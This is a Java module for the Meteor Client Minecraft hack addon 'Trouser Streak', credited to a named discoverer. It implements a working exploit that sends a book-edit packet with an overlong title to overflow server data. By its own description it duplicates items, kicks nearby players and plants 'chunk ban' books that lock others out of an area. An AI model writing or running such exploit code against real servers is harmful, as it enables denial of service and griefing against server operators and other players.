//Credits to Thorioum https://github.com/Thorioum for discovery of this!

package pwn.noobs.trouserstreak.modules;

import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.game.OpenScreenEvent;
import meteordevelopment.meteorclient.settings.BoolSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.client.gui.screens.DisconnectedScreen;
import net.minecraft.network.protocol.game.ServerboundEditBookPacket;
import net.minecraft.world.inventory.ContainerInput;
import net.minecraft.world.item.Items;
import pwn.noobs.trouserstreak.Trouser;

import java.util.ArrayList;
import java.util.Optional;

public class BookAndQuillDupe extends Module {
    private final SettingGroup sgSpecial = settings.createGroup("Book And Quill Dupe works on server versions 1.20.6+");
    private final Setting<Boolean> disconnectdisable = sgSpecial.add(new BoolSetting.Builder()
            .name("Disable on Disconnect")
            .description("Disables module on disconnecting")
            .defaultValue(true)
            .build());
    public final Setting<Boolean> donottoss = sgSpecial.add(new BoolSetting.Builder()
            .name("dont-toss-inventory")
            .description("Use if you don't want to empty your inventory and just want to kick people in radius.")
            .defaultValue(false)
            .build()
    );
    public final Setting<Boolean> chunkBan = sgSpecial.add(new BoolSetting.Builder()
            .name("create-chunk-ban")
            .description("Tosses the cursed book on the ground.")
            .defaultValue(false)
            .build()
    );
    public BookAndQuillDupe() {
        super(Trouser.Main, "Book-And-Quill-Dupe", "Overflows data in a book's title to cause dupes and chunk bans. Credits to Thorioum! Only works in servers up to version 1.21, or Vanilla 1.21.1.");
    }
    @EventHandler
    private void onScreenOpen(OpenScreenEvent event) {
        if (disconnectdisable.get() && event.screen instanceof DisconnectedScreen) toggle();
    }
    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (disconnectdisable.get()) toggle();
    }
    @Override
    public void onActivate() {
        if (mc.player.getMainHandItem().getItem() != Items.WRITABLE_BOOK) {
            error("You must be holding a writable book to use this.");
            toggle();
            return;
        }
        ArrayList<String> pages = new ArrayList<>();
        pages.add("popbob");
        if (!donottoss.get()){
            for (int i = 9; i <= 44; i++) {
                if (mc.player.getInventory().getSelectedSlot() == i-36) continue;
                mc.gameMode.handleContainerInput(mc.player.containerMenu.containerId, i, 10, ContainerInput.THROW, mc.player);
            }
            mc.player.connection.send(new ServerboundEditBookPacket(mc.player.getInventory().getSelectedSlot(), pages, Optional.of("popbobfunnysexdupe2024hahafunnyrealrealreal")));
            if (chunkBan.get())mc.gameMode.handleContainerInput(mc.player.containerMenu.containerId, 36, 10, ContainerInput.THROW, mc.player);
        } else {
            mc.player.connection.send(new ServerboundEditBookPacket(mc.player.getInventory().getSelectedSlot(), pages, Optional.of("popbobfunnysexdupe2024hahafunnyrealrealreal")));
            if (chunkBan.get())mc.gameMode.handleContainerInput(mc.player.containerMenu.containerId, 36, 10, ContainerInput.THROW, mc.player);
        }
        toggle();
    }
}